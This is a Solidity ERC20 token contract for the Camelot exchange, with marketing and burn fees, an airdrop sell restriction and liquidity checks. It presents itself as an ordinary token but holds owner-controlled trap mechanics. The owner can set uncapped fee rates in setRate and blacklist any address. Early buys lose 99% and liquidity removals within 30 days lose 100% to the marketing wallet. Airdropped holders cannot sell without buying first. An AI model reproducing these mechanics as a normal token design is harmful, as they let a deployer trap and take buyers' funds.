// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;

import "./Ownable.sol";
import "./SafeERC20.sol";
import "./IERC20.sol";
import "./ICamelotRouter.sol";
import "./ICamelotFactory.sol";
import "./ICamelotPair.sol";
import "./SafeMath.sol";
import "./Address.sol";

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    using Address for address;

    receive() external payable {}

    string private _name;
    string private _symbol;
    uint8 private _decimals = 18;

    address private marketingAddress;
    address private airdropAddress;
    address private swapAddress;

    uint256 private buyMarketRate;
    uint256 private sellMarketRate;
    uint256 private sellBurnRate;
    uint256 private swapRate;

    uint256 private sellLimitRate;

    mapping(address => uint256) private _receiveTotal;
    mapping(address => uint256) private _buyTotal;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isMarketPair;

    mapping(address => bool) public isBlackList;

    bool public takeFeeDisabled;
    bool public swapEnabled;
    bool public tradeEnabled;
    bool public addLiquidityEnabled;
    bool public feeConvertEnabled;

    uint256 public startBlock;
    uint256 public startTime;
    uint256 public removeLPFeeDuration;

    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply = 100000000000 * 10 ** _decimals;
    ICamelotRouter public router;
    address public pairAddress;
    bool inSwapAndLiquify;

    constructor(address _marketing, address _airdropAddress, address _swap) {
        _name = "TEST";
        _symbol = "TEST";

        ICamelotRouter _router = ICamelotRouter(
            0xc873fEcbd354f5A56E00E710B90EF4201db2448d
        );

        router = _router;

        marketingAddress = _marketing;
        airdropAddress = _airdropAddress;
        swapAddress = _swap;

        buyMarketRate = 3;
        sellMarketRate = 3;
        sellBurnRate = 1;
        sellLimitRate = 80;

        removeLPFeeDuration = 30 days;

        isExcludedFromFee[marketingAddress] = true;
        isExcludedFromFee[airdropAddress] = true;
        isExcludedFromFee[swapAddress] = true;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        isMarketPair[address(pairAddress)] = true;

        addLiquidityEnabled = false;
        tradeEnabled = false;
        takeFeeDisabled = false;

        swapEnabled = false;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function initPair() public onlyOwner {
            pairAddress = ICamelotFactory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        isMarketPair[address(pairAddress)] = true;
    }

    function setPairAddress(address pair) public onlyOwner {
        pairAddress=pair;
        isMarketPair[address(pairAddress)] = true;
    }

    function rescueToken(
        address tokenAddress,
        uint256 tokens
    ) public onlyOwner returns (bool success) {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function rescueETH(address payable _recipient) public onlyOwner {
        _recipient.transfer(address(this).balance);
    }

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        require(
            spender != address(router) ||
                addLiquidityEnabled ||
                isExcludedFromFee[owner],
            "can't add liquidity"
        );

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(
        address account,
        bool newValue
    ) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setTakeFeeDisabled(bool _value) public onlyOwner {
        takeFeeDisabled = _value;
    }

    function setSwapEnabled(bool _value) public onlyOwner {
        swapEnabled = _value;
    }

    function setRemoveLPFeeDuration(uint256 duration) external onlyOwner {
        removeLPFeeDuration = duration;
    }

    function setTradeEnabled(bool _value) public onlyOwner {
        tradeEnabled = _value;
        if (_value && startBlock == 0) {
            startBlock = block.number;
            startTime = block.timestamp;
        }
    }

    function setAddLiquidityEnabled(bool _value) public onlyOwner {
        addLiquidityEnabled = _value;
    }

    function setIsExcludedFromFee(
        address account,
        bool newValue
    ) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function setIsExcludedFromFeeBatch(
        bool newValue,
        address[] calldata accounts
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isExcludedFromFee[accounts[i]] = newValue;
        }
    }

    function setIsBlackList(address account, bool newValue) public onlyOwner {
        isBlackList[account] = newValue;
    }

    function setRate(
        uint256 _buyMarket,
        uint256 _sellMarket,
        uint256 _sellBurn,
        uint256 _sellLimitRate
    ) external onlyOwner {
        buyMarketRate = _buyMarket;
        sellMarketRate = _sellMarket;
        sellBurnRate = _sellBurn;
        sellLimitRate = _sellLimitRate;
    }

    function setAddress(
        address _marketing,
        address _airdrop,
        address _swap
    ) external onlyOwner {
        marketingAddress = _marketing;
        airdropAddress = _airdrop;
        swapAddress = _swap;

        isExcludedFromFee[swapAddress] = true;
        isExcludedFromFee[airdropAddress] = true;
        isExcludedFromFee[marketingAddress] = true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if (inSwapAndLiquify) {
            _basicTransfer(sender, recipient, amount);
        } else {
            require(
                !isBlackList[sender] && !isBlackList[recipient],
                "address is black"
            );
            if (amount == 0) {
                _balances[recipient] = _balances[recipient].add(amount);
                return;
            }
            if (isMarketPair[sender]) {
                _buyTotal[recipient] = _buyTotal[recipient].add(amount);
            }
            if (
                sender == airdropAddress &&
                _receiveTotal[recipient] == 0 &&
                recipient != pairAddress
            ) {
                _receiveTotal[recipient] = amount;
            }

            _balances[sender] = _balances[sender].sub(
                amount,
                "Insufficient Balance"
            );

            bool needTakeFee;
            bool isRemoveLP;
            bool isAdd;

            if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {
                needTakeFee = true;
                if (isMarketPair[recipient]) {
                    isAdd = _isAddLiquidity();
                    if (isAdd) {
                        needTakeFee = false;
                    }
                } else {
                    isRemoveLP = _isRemoveLiquidity();
                }
            }

            if (
                swapEnabled &&
                isMarketPair[recipient] &&
                balanceOf(address(this)) > amount.div(2)
            ) {
                swapTokensForETH(amount.div(2), swapAddress);
            }


            uint256 finalAmount = (isExcludedFromFee[sender] ||
                isExcludedFromFee[recipient]) ||
                takeFeeDisabled ||
                !needTakeFee
                ? amount
                : takeFee(sender, recipient, amount, isRemoveLP);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapTokensForETH(
        uint256 tokenAmount,
        address to
    ) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            to,
            address(0),
            block.timestamp
        );
    }

    /**
     * @notice It allows the admin to recover wrong tokens sent to the contract
     * @param _tokenAddress: the address of the token to withdraw
     */
    function rescueTokens(address _tokenAddress) external onlyOwner {
        require(_tokenAddress != address(this), "cannot be this token");
        IERC20(_tokenAddress).safeTransfer(
            address(msg.sender),
            IERC20(_tokenAddress).balanceOf(address(this))
        );
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount,
        bool isRemoveLP
    ) internal returns (uint256) {
        uint256 feeAmount = 0;
        uint256 _amount = amount;
        address _sender = sender;

        if (isMarketPair[_sender] || isMarketPair[recipient]) {
            require(tradeEnabled, "TRADE DISABLED");
            uint256 burnRate = 0;
            uint256 marketRate = 0;
            uint256 blockRate = 0;
            uint256 removeLPRate = 0;
            if (isMarketPair[_sender]) {
                // buy
                marketRate = buyMarketRate;
                if (block.number - 20 < startBlock) {
                    blockRate = uint256(99).sub(marketRate);
                }
            } else {
                //sell
                require(
                    _buyTotal[_sender] >=
                        _receiveTotal[_sender].mul(sellLimitRate).div(100),
                    "insufficient buy amount"
                );
                burnRate = sellBurnRate;
                marketRate = sellMarketRate;
            }
            if (isRemoveLP) {
                if (block.timestamp < startTime + removeLPFeeDuration) {
                    removeLPRate = 1;
                }
            }
            if (removeLPRate == 1) {
                _balances[marketingAddress] = _balances[marketingAddress].add(amount);
                emit Transfer(_sender, marketingAddress, amount);
                feeAmount = amount;
            } else {
                //block
                uint256 blockAmount = _amount.mul(blockRate).div(100);
                if (blockAmount > 0) {
                    _balances[marketingAddress] = _balances[marketingAddress].add(
                        blockAmount
                    );
                    emit Transfer(_sender, marketingAddress, blockAmount);
                }

                //burn
                uint256 burnAmount = _amount.mul(burnRate).div(100);
                if (burnAmount > 0) {
                    _balances[deadAddress] = _balances[deadAddress].add(
                        burnAmount
                    );
                    emit Transfer(_sender, deadAddress, burnAmount);
                }

                //reward to market
                uint256 marketAmount = _amount.mul(marketRate).div(100);
                if (marketAmount > 0) {
                    _balances[marketingAddress] = _balances[marketingAddress].add(
                        marketAmount
                    );
                    emit Transfer(_sender, marketingAddress, marketAmount);
                }
                feeAmount = burnAmount.add(marketAmount).add(blockAmount);
            }
        } else {
            require(
                _buyTotal[sender] >=
                    _receiveTotal[sender].mul(sellLimitRate).div(100),
                "insufficient buy amount"
            );
        }
        return amount.sub(feeAmount);
    }

    function _isAddLiquidity() internal view returns (bool isAdd) {
        ICamelotPair mainPair = ICamelotPair(pairAddress);
        (uint256 r0, uint256 r1, uint256 f0, uint256 f1) = mainPair
            .getReserves();

        address tokenOther = router.WETH();
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint256 bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove) {
        ICamelotPair mainPair = ICamelotPair(pairAddress);
        (uint256 r0, uint256 r1, uint256 f0, uint256 f1) = mainPair
            .getReserves();

        address tokenOther = router.WETH();
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint256 bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }
}

